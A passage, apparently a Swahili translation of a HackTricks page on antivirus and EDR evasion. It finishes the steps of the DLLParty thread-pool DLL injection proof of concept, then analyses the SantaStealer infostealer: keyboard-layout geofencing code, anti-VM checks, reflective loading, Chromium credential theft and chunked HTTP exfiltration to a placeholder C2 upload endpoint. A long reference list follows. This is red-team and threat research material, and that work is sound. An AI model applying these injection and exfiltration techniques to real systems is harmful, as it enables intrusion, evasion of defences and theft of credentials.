3. Andika path ya DLL kwenye nafasi **kila** worker iliyopatikana kwa sababu completion iliyowekwa kwenye foleni inaweza kuchukuliwa na worker yeyote. Weka `TP_DIRECT` kwenye memory ya target inayoweza kuandikwa, ikiwa na `Callback = LoadLibraryA`. PoC hutumia `last_slot-0x500` kwenye stack ya worker badala ya `VirtualAllocEx`; offset hiyo ni ya majaribio na haipaswi kugongana na data ya stack inayotumika.
4. Nakili handle ya completion-port ya target na uite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Anwani ya remote `TP_DIRECT` ndiyo completion key. Worker iliyopo kisha huita `LoadLibraryA` kwa kutumia pointer yake ya callback-instance iliyofutwa, na kupakia DLL ambayo tayari inapatikana kwa target.

PoC hupokea PID ya target (`DLLParty.exe <target_pid>`) na hutumia path ya DLL iliyowekwa moja kwa moja kwenye `DLLParty.cpp`; weka path inayoweza kufikiwa na target kabla ya kuunda executable ya x64. Pia hutumia anwani ya `LoadLibraryA` ya process yake yenyewe kama callback ya remote, hivyo hudhani kuwa anwani hiyo ni sahihi kwenye target. Code haikague urefu wa path dhidi ya prefix ya baiti 0x58 wala kuthibitisha kwamba traversal ya workers ilipata nafasi kabla ya kufikia element ya mwisho. Thibitisha upya private offsets, mpangilio wa stack na nafasi inayoweza kuandikwa kwa build ya target. Kuacha kutumia `CreateRemoteThreadEx`, shellcode na `VirtualAllocEx` hakuondoi writes kati ya processes au telemetry ya upakiaji wa DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Mbinu za SantaStealer za Fileless Evasion na Wizi wa Credentials

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyochanganya AV bypass, anti-analysis na ufikiaji wa credentials kwenye workflow moja.<sup>[[24]](#references)</sup>

### Uchujaji kwa mpangilio wa kibodi na ucheleweshaji wa sandbox

- Bendera ya usanidi (`anti_cis`) huorodhesha mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa mpangilio wa Kisiriliki utapatikana, sample huacha alama tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, kuhakikisha haitawahi kuanza kutekelezwa kwenye maeneo yaliyotengwa huku ikiiacha artifact ya kutafutwa.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya process, huhesabu hash ya kila jina kwa kutumia rolling checksum maalum, na kulinganisha matokeo na blocklist zilizopachikwa za debugger/sandbox; hurudia checksum hiyo kwa jina la kompyuta na hukagua working directories kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kiwango cha chini cha idadi ya process, muda wa hivi karibuni tangu kuwashwa), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hukagua muda kabla na baada ya kusubiri ili kubaini single-stepping. Ugunduzi wowote husababisha kusitishwa kabla modules hazijazinduliwa.

### Helper ya Fileless + reflective loading maradufu ya ChaCha20

- DLL/EXE kuu hupachika Chromium credential helper ambayo aidha huhifadhiwa kwenye diski au huwekwa mwenyewe kwenye memory; hali ya fileless hutatua imports/relocations yenyewe ili kusiandikwe helper artifacts zozote.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya kusimbua mara zote mbili, hupakia blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zinazotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza msimbo kwenye Chromium browser inayofanya kazi, kurithi AppBound Encryption keys, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa modular ndani ya memory na exfil ya HTTP kwa vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function pointers `memory_generators` na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya kipindi cha kujiunga cha takriban sekunde 45.
- Baada ya kukamilika, kila kitu hubanwa kwa kutumia maktaba ya `miniz` iliyounganishwa tuli na kuhifadhiwa kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive kwa HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikijifanya kuwa browser kwa kutumia `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, na kwa hiari `w: <campaign_tag>`; kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa uunganishaji upya umekamilika.

## References

- [1] [Mbinu za Kina za Kukwepa: Module Stomping kwa Usahihi](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blogu](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena pasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC ya kughushi call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Msururu Mpya wa Maambukizi na Ufichaji wa ConfuserEx wa DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kukwepa ukaguzi wa hali ya Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Storm-2603 za Ransomware](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Forwarded Exports za Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa process na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Rejeleo la EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kizindua cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDR kwa Usaidizi wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja Ganda la Ulinzi la Windows Defender kwa Mbinu ya Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Rejeleo la amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya Yenye Malengo Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Kusimbua Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Malware ya Node.js kwa Kufuatilia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Kuharibu Vigezo vya Process](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, na Kughushi Stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ufichaji wa usingizi wa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kugeuza Driver ya Remediation ya Defender kuwa Primitive ya Operesheni za Kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo mwenza wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Functions Zinazojificha kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Msimbo wa InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Function ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Kuunda Child Process yenye Input na Output Zilizorejelewa](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Kuunda Upya Zana za C# kwa WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kukompile Miradi ya C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Uthibitisho wa dhana na msimbo wa DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Kutumia vibaya mambo ya ndani ya thread pool kwa DLL injection isiyotumia shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Seti ya data ya benchmark ya EMBER2024 na zana za thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Kutumia EMBER2024 kutathmini red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Kukwepa Utambuzi Unaotegemea Machine Learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Framework ya upakiaji wa .NET ya NetamLoader inayotumia XAML](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Orodhesho la AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Mbinu ya IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - Uchambuzi wa kiufundi wa 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
{{#include ../banners/hacktricks-training.md}}
